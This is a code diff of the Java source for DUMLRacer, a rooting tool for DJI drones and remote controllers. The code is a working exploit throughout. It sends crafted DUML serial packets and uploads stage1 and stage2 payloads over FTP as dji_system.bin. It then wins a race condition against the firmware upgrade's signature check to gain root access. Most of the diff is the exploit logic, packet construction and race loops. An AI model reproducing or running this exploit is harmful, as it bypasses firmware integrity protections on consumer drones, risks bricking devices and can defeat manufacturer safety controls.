@@ -1,11 +1,13 @@
 package com.cunninglogic.dumlracer;
 
 import com.fazecast.jSerialComm.SerialPort;
-import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
 import org.apache.commons.net.ftp.FTPFile;
 
 import java.io.*;
+import java.nio.ByteBuffer;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 
 public class Main {
 
@@ -15,60 +17,27 @@ public class Main {
 
     private static FTPClient ftpClient;
 
-    //ToDo select RC/Google/AC
 
-    private static byte[] upgradeModePKT;
-    private static byte[] fileSizePKT;
-    private static  byte[] hashPKT;
-    private static byte[] fileSizePKT2;
-    private static  byte[] hashPKT2;
-
+    private static boolean isRC = false;
 
     public static void main(String[] args) throws IOException {
-        System.out.println("DUMLRacer 1.0");
+
+
+        System.out.println("DUMLRacer 1.1");
 	    System.out.println("Copyright 2017/2018 APIs Research LLC");
         System.out.println("jcase in the house!\n");
 
-        System.out.println("This software comes with NO WARRANTY AT ALL. If it bricks your equipment, your fault not anyone else's. " +
-                "You agree to take full responsibility of any harm, damage, injury or loss of life from using your equipment improperly. "+
-                "Do not use this software to illegally modify your equipment. Do not redistribute this software. Do not use it in any " +
-                "commercial venture without first getting written permission from APIs Research LLC.\n");
-
+        System.out.println("This software comes with NO WARRANTY AT ALL. If it bricks your equipment, your fault not" +
+                " anyone else's.");
+        System.out.println("By using this software, you agree to take full responsibility of any harm, damage, injury or " +
+                "loss of life from using your equipment improperly.");
+        System.out.println("Do not use this software to illegally modify your equipment. Do not redistribute this software. " +
+                "Do not use it in any ");
+        System.out.println("commercial venture without first getting written permission from APIs Research LLC.\n");
+        
 
         if (args.length != 1 || (!args[0].equals("AC") && !args[0].equals("RC"))) {
             printHelp();
-            return;
-        }
-
-        if (args[0].equals("AC")) {
-            upgradeModePKT = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x28, 0x65, 0x57, 0x40, 0x00, 0x07, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x27, (byte)0xD3};
-            fileSizePKT = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00, 0x6F,
-                    (byte)0xE4, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x20, 0x7F};
-            hashPKT = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
-                    (byte)0xB0, (byte)0x95, (byte)0xDD, 0x44, 0x26, 0x20, 0x1C, (byte)0xB0, 0x58, 0x4A, (byte)0x9A, 0x13,
-                    0x75, 0x3F, (byte)0x92, (byte)0x9D, 0x4F, (byte)0xBB};
-            fileSizePKT2 = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00,
-                    (byte)0xB7, (byte)0xC7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x11, 0x35};
-            hashPKT2 = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
-                    0x30, 0x4C, (byte)0xC3, 0x64, 0x71, (byte)0xE3, 0x04, 0x23, 0x35, 0x18, 0x42, (byte)0xA8, 0x23,
-                    (byte)0xB6, (byte)0xA0, 0x41, 0x3C, (byte)0xF3};
-
-        } else if (args[0].equals("RC")) {
-            upgradeModePKT = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x2D, (byte)0xE7, 0x27, 0x40, 0x00, 0x07,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte)0x9F, 0x44};
-            fileSizePKT = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08,
-                    0x00, 0x6F, (byte)0xE4, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x50, (byte)0xFD};
-            hashPKT = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00, (byte)0xB0,
-                    (byte)0x95, (byte)0xDD, 0x44, 0x26, 0x20, 0x1C, (byte)0xB0, 0x58, 0x4A, (byte)0x9A, 0x13, 0x75, 0x3F,
-                    (byte)0x92, (byte)0x9D, (byte)0x99, (byte)0xD6};
-            fileSizePKT2 = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08,
-                    0x00, (byte)0xB7, (byte)0xC7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x61, (byte)0xB7};
-            hashPKT2 = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00, 0x30,
-                    0x4C, (byte)0xC3, 0x64, 0x71, (byte)0xE3, 0x04, 0x23, 0x35, 0x18, 0x42, (byte)0xA8, 0x23, (byte)0xB6,
-                    (byte)0xA0, 0x41, (byte)0xEA, (byte)0x9E};
-        } else {
-            System.out.println("wth?");
             return;
         }
 
@@ -79,8 +48,20 @@ public class Main {
         System.out.println("Amazon giftcards, plain thank yous or anything else -> jcase@cunninglogic.com");
         System.out.println("Any donations in excess of the drone cost, will go to Special Olympics!\n");
 
-        classLoader = Main.class.getClassLoader();
+        System.out.println("****Attention****");
+        System.out.println("After a successful run, you will need to reboot the device.");
+        System.out.println("After rebooting you can use adb for root access, or you can downgrade.\n");
 
+
+        if (args[0].equals("RC")) {
+            isRC = true;
+            System.out.println("RC Mode");
+        } else {
+            System.out.println("AC Mode");
+        }
+        System.out.println();
+
+        classLoader = Main.class.getClassLoader();
 
         int count = 1;
 
@@ -89,6 +70,7 @@ public class Main {
             if (s.getDescriptivePortName().contains("DJI")) {
                 System.out.print("*");
             }
+
 
             System.out.println("\t[" + count + "] " + s.getSystemPortName() + " : " + s.getDescriptivePortName());
             count++;
@@ -125,6 +107,201 @@ public class Main {
             }
         }
 
+        connect();
+
+
+
+
+        byte[] payload1 = isToArray(classLoader.getResourceAsStream("resources/stage1.bin"));
+
+        byte[] payload2 = isToArray(classLoader.getResourceAsStream("resources/stage2.bin"));
+
+
+        //Stage one
+        System.out.println("Sending upgrade command");
+        write(getUpgradePacket());
+        write(getReportPacket());
+
+        System.out.println("Uploading payload 1");
+        uploadFile(classLoader.getResourceAsStream("resources/stage1.bin"));
+
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        write(getFileSizePacket(payload1.length));
+
+        System.out.println("Exploiting");
+        write(getHashPacket(payload1));
+
+
+        //First race
+        System.out.println("Race 1 has started");
+        boolean flag = false;
+        while (!flag) {
+            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
+
+            for (FTPFile f : files) {
+                if (f.toString().contains("flag")) {
+                    flag = true;
+                    break;
+                }
+            }
+        }
+
+        ftpClient.rename("/upgrade/upgrade/signimgs/jcase","/upgrade/upgrade/jcase");
+
+
+        write(new byte[]{0x55, 0x0D, 0x04, 0x33, 0x2A, 0x28, 0x68, 0x57, 0x00, 0x00, 0x0A, (byte)0xF0, 0x3C});
+        System.out.println("You won race one, taking a breather for 10 seconds");
+
+        try {
+            Thread.sleep(5000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        activePort.closePort();
+        ftpClient.disconnect();
+
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        connect();
+
+        try {
+            Thread.sleep(2000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        System.out.println("You feel great, like you could race again!");
+
+        //Stage two
+        System.out.println("Sending upgrade command");
+        write(getUpgradePacket());
+        write(getReportPacket());
+
+        System.out.println("Uploading payload 2");
+        uploadFile(classLoader.getResourceAsStream("resources/stage2.bin"));
+
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        write(getFileSizePacket(payload2.length));
+
+        System.out.println("Exploiting");
+        write(getHashPacket(payload2));
+
+        //First race
+        System.out.println("Race 2 has started");
+
+        flag = false;
+        while (!flag) {
+            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
+
+            for (FTPFile f : files) {
+                if (f.toString().contains("dummy")) {
+                    flag = true;
+                    break;
+                }
+            }
+        }
+
+        boolean winner = ftpClient.rename("/upgrade/upgrade/jcase","/upgrade/upgrade/signimgs/jcase");
+
+        if (winner) {
+            System.out.println("You are in the lead!");
+        } else {
+            System.out.println("You fell down and skinned your knee, reboot the target and try again!");
+            activePort.closePort();
+            ftpClient.disconnect();
+            return;
+        }
+
+        flag = false;
+        while (!flag) {
+            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
+
+            for (FTPFile f : files) {
+                if (f.toString().contains("wellhello")) {
+                    flag = true;
+                    break;
+                }
+            }
+        }
+
+        ftpClient.deleteFile("/upgrade/upgrade/signimgs/jcase");
+
+
+        winner = false;
+
+        int timeout = 0;
+        while (!winner) {
+            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
+            if (files.length == 0) {
+                winner = true;
+                break;
+            }
+            System.out.print(".");
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+
+            timeout +=1;
+
+            if (timeout > 60) {
+                System.out.println();
+                System.out.println("Race timed out, unsure who won. Reboot and check");
+                System.out.println("Reboot the target device. and try using adb (for root) or downgrading.");
+                ftpClient.disconnect();
+                activePort.closePort();
+                return;
+            }
+        }
+
+        System.out.println();
+        System.out.println("Looks like you won!.");
+        System.out.println("Reboot the target device. and try using adb (for root) or downgrading.");
+        activePort.closePort();
+        ftpClient.disconnect();
+
+    }
+
+    private static byte[] isToArray(InputStream is) throws IOException {
+
+        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+
+        int nRead;
+        byte[] data = new byte[16384];
+
+        while ((nRead = is.read(data, 0, data.length)) != -1) {
+            buffer.write(data, 0, nRead);
+        }
+
+        buffer.flush();
+
+        return buffer.toByteArray();
+    }
+    private static void write(byte[] packet) {
+        activePort.writeBytes(packet,packet.length);
+        try {
+            Thread.sleep(5000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static void connect () {
         if (activePort == null) {
             System.out.println("Couldn't find port, exiting");
             return;
@@ -144,156 +321,6 @@ public class Main {
         }
 
         activePort.setBaudRate(115200);
-
-        System.out.println();
-
-
-        //Enter upgrade mode (delete old file if exists)
-        activePort.writeBytes(upgradeModePKT,upgradeModePKT.length);
-
-
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-        try {
-            ftpClient = new FTPClient();
-            ftpClient.connect("192.168.42.2", 21);
-            ftpClient.login("jcase","password");
-            ftpClient.enterLocalPassiveMode();
-
-            System.out.println("Uploading first payload");
-            upload("resources/stage1.bin");
-        } catch (Exception e) {
-            System.out.println("Couldn't talk to ftpD");
-            activePort.closePort();
-            e.printStackTrace();
-            return;
-        }
-
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-
-        activePort.writeBytes(fileSizePKT,fileSizePKT.length);
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-
-        activePort.writeBytes(hashPKT,hashPKT.length);
-
-        System.out.println("Starting the first race!");
-        race1();
-        FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/");
-        boolean winner = false;
-        for (FTPFile f : files) {
-            if (f.toString().contains("freedom")) {
-                winner = true;
-                break;
-            }
-        }
-
-        if (winner) {
-            System.out.println("You got first place! DJI Lost that race!");
-        } else {
-            System.out.println("You lost the race! :(");
-            ftpClient.disconnect();
-            activePort.closePort();
-            return;
-        }
-
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-        activePort.writeBytes(upgradeModePKT,upgradeModePKT.length);
-      //  activePort.writeBytes(enableReportingPKT,enableReportingPKT.length);
-
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-        try {
-            System.out.println("Uploading second payload");
-
-            upload("resources/stage2.bin");
-        } catch (Exception e) {
-            System.out.println("Couldn't talk to ftpD");
-            activePort.closePort();
-            e.printStackTrace();
-            return;
-        }
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-
-
-
-        activePort.writeBytes(fileSizePKT2,fileSizePKT2.length);
-
-        try {
-            Thread.sleep(5000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-
-
-
-        activePort.writeBytes(hashPKT2,hashPKT2.length);
-
-
-
-        System.out.println("Starting the second race!");
-        race2();
-
-        winner = false;
-
-
-        int timeout = 0;
-        while (!winner) {
-            files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
-            if (files.length == 0) {
-		winner = true;
-                break;
-            }
-            System.out.print(".");
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-
-            timeout +=1;
-
-            if (timeout > 300) {
-                System.out.println("Something went wrong, I guess you can try downgrading and see?");
-                activePort.closePort();
-                ftpClient.disconnect();
-                return;
-            }
-        }
-
-        System.out.println("\nLooks like we won the race, try downgrading!");
-
-        activePort.closePort();
-        ftpClient.disconnect();
-
-
     }
 
     private static void printHelp() {
@@ -303,83 +330,94 @@ public class Main {
         System.out.println("RC - target RC");
     }
 
-    private static void race1() throws IOException {
-        boolean flag = false;
-        while (!flag) {
-            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
-
-            for (FTPFile f : files) {
-                if (f.toString().contains("flag")) {
-                    flag = true;
-                    break;
-                }
-            }
+    public static void uploadFile(InputStream payload) throws IOException {
+        if (ftpClient == null) {
+            ftpClient = new FTPClient();
         }
 
-        ftpClient.rename("/upgrade/upgrade/signimgs/freedom","/upgrade/upgrade/freedom");
-        ftpClient.rename("/upgrade/upgrade/signimgs/jcase","/upgrade/upgrade/jcase");
-    }
-
-    private static void race2() throws IOException {
-        boolean flag = false;
-        while (!flag) {
-            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
-
-            for (FTPFile f : files) {
-                if (f.toString().contains("dummy")) {
-                    flag = true;
-                    break;
-                }
-            }
+        if (!ftpClient.isConnected()) {
+            ftpClient.connect("192.168.42.2", 21);
+            ftpClient.login("nouser","nopass");
+            ftpClient.enterLocalPassiveMode();
         }
 
+        ftpClient.setFileType(ftpClient.BINARY_FILE_TYPE);
 
-
-        ftpClient.rename("/upgrade/upgrade/freedom","/upgrade/upgrade/signimgs/freedom");
-        ftpClient.rename("/upgrade/upgrade/jcase","/upgrade/upgrade/signimgs/jcase");
-
-        flag = false;
-        while (!flag) {
-            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
-
-            for (FTPFile f : files) {
-                if (f.toString().contains("wellhello")) {
-                    flag = true;
-                    break;
-                }
-            }
-        }
-
-
-        ftpClient.deleteFile("/upgrade/upgrade/signimgs/freedom");
-        ftpClient.deleteFile("/upgrade/upgrade/signimgs/jcase");
-    }
-
-    private static void upload(String fileName) throws Exception {
-        InputStream is = classLoader.getResourceAsStream(fileName);
-        ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
-        boolean done = ftpClient.storeFile("/upgrade/dji_system.bin", is);
-        is.close();
+        boolean done = ftpClient.storeFile("/upgrade/dji_system.bin", payload);
+        payload.close();
         if (!done) {
             System.out.println("Failed to upload payload.");
             System.exit(-1);
         }
     }
 
-    //start the race
-    private static void DJI_stop_violating_the_GPL() {
+    private static byte[] getFileSizePacket(int fileSize) {
+        byte[] packet = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00,
+                0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04};
 
-    }
-
-    final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
-
-    public static String bytesToHex(byte[] bytes) {
-        char[] hexChars = new char[bytes.length * 2];
-        for (int j = 0; j < bytes.length; j++) {
-            int v = bytes[j] & 0xFF;
-            hexChars[j * 2] = hexArray[v >>> 4];
-            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
+        if (isRC) {
+            packet = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08, 0x00,
+                    0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04};
         }
-        return new String(hexChars);
+
+        byte[] size = ByteBuffer.allocate(4).putInt(fileSize).array();
+
+        packet[12] = size[3];
+        packet[13] = size[2];
+        packet[14] = size[1];
+        packet[15] = size[0];
+
+        return  CRC.pktCRC(packet);
     }
+
+    private static byte[] getHashPacket(byte[] payload) {
+        byte[] packet  = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+        if (isRC) {
+            packet = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        }
+
+        byte[] md5 = payload;
+
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            md5 = md.digest(md5);
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        }
+
+        System.arraycopy(md5,0, packet, 12, 16);
+
+        return  CRC.pktCRC(packet);
+    }
+
+    private static byte[] getUpgradePacket() {
+
+        byte[] packet = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x28, 0x65, 0x57, 0x40, 0x00, 0x07, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x27, (byte)0xD3};
+
+        if (isRC) {
+            packet = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x2D, (byte)0xE7, 0x27, 0x40, 0x00, 0x07, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte)0x9F, 0x44};
+        }
+
+        return packet;
+    }
+
+    private static byte[] getReportPacket() {
+
+        byte[] packet = new byte[] {0x55, 0x0E, 0x04, 0x66, 0x2A, 0x28, 0x68, 0x57, 0x40, 0x00, 0x0C, 0x00, (byte)0x88,
+                0x20};
+
+        if (isRC) {
+            packet = new byte[] {0x55, 0x0E, 0x04, 0x66, 0x2A, 0x2D, (byte)0xEA, 0x27, 0x40, 0x00, 0x0C, 0x00, 0x2C,
+                    (byte)0xC8};
+        }
+        return packet;
+    }
+
 }
